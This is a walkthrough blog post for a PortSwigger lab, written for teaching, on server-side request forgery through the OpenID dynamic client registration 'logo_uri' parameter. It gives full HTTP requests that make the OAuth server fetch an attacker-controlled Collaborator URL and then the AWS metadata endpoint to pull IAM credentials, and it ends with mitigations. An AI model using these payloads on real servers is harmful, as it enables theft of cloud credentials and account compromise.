---
title: "SSRF via OpenID Dynamic Client Registration – PortSwigger Lab Walkthrough"
date: 2026-03-09
categories: [Web Security, SSRF]
tags: [ssrf, oauth, portswigger, burpsuite, cloud security]
image: assets/img/ssrf-openid/ssrf.png
---

## Introduction

This lab demonstrates how **Server-Side Request Forgery (SSRF)** can occur through **OpenID Dynamic Client Registration**.

The OAuth server allows applications to **register themselves dynamically**. However, the `logo_uri` parameter is fetched by the server without proper validation.

This allows an attacker to force the server to make requests to **internal resources**, including cloud metadata services.

Our goal is to retrieve the **AWS metadata credentials** from:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
```

---

# Lab Information

Platform: PortSwigger Web Security Academy  
Vulnerability: SSRF  
Target: OAuth dynamic client registration endpoint

Test credentials:

```
username: wiener
password: peter
```

---

# Step 1 – Login to the Application

Login to the lab using the provided credentials.

```
wiener:peter
```
---

# Step 2 – Discover OpenID Configuration

Navigate to the OpenID configuration endpoint:

```
https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
```

This reveals important OAuth endpoints.

One key endpoint is the **dynamic client registration endpoint**:

```
/reg
```
---

# Step 3 – Register a New OAuth Client

Using **Burp Suite Repeater**, create a POST request to register a new OAuth client.

```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris": [
        "https://example.com"
    ]
}
```

Send the request.

The server responds with metadata including:

- `client_id`
- `client_secret`

---

# Step 4 – Investigate Client Logo Fetching

During the OAuth authorization flow, the **client application's logo is displayed**.

The logo is retrieved via:

```
/client/CLIENT-ID/logo
```

According to the OpenID specification, the client can provide a logo URL via the `logo_uri` parameter.

This creates a potential SSRF vector.

---

# Step 5 – Confirm SSRF with Burp Collaborator

Modify the registration request to include `logo_uri`.

Insert a **Burp Collaborator** payload.

```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": [
    "https://example.com"
  ],
  "logo_uri": "https://BURP-COLLABORATOR-ID"
}
```

Send the request.

Copy the returned `client_id`.

---

# Step 6 – Trigger the Logo Request

Now trigger the logo fetch:

```
GET /client/CLIENT-ID/logo
```

Replace `CLIENT-ID` with the newly generated one.

---

# Step 7 – Verify SSRF Interaction

Check **Burp Collaborator interactions**.

You should see the OAuth server attempting to fetch your payload URL.

This confirms that the server is making outbound requests.

---

# Step 8 – Exploit SSRF to Access Cloud Metadata

Now change the `logo_uri` to the **AWS metadata endpoint**.

```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": [
    "https://example.com"
  ],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

Send the request and copy the new `client_id`.

---

# Step 9 – Retrieve IAM Credentials

Trigger the logo request again.

```
GET /client/CLIENT-ID/logo
```

The response now contains **AWS IAM credentials**, including:

- Access Key
- Secret Access Key
- Token

---

# Step 10 – Submit the Access Key

Copy the **secret access key** from the response.

Submit it using the **Submit Solution** button to complete the lab.

---

# Key Takeaways

This lab demonstrates how **improper input validation in OAuth dynamic registration** can lead to SSRF.

Important lessons:

- Never allow servers to fetch **user-controlled URLs**
- Block access to **169.254.169.254 metadata endpoints**
- Implement **SSRF protections and allowlists**

---

# Security Mitigations

Recommended defenses include:

- URL allowlisting
- Blocking internal IP ranges
- Disabling requests to metadata services
- Validating external resources

---

# Final Thoughts

SSRF vulnerabilities are especially dangerous in **cloud environments**, where attackers can retrieve **IAM credentials from metadata services**.

Misconfigurations like this can lead to **full cloud account compromise**.

Understanding how OAuth features interact with backend systems is crucial for securing modern web applications.

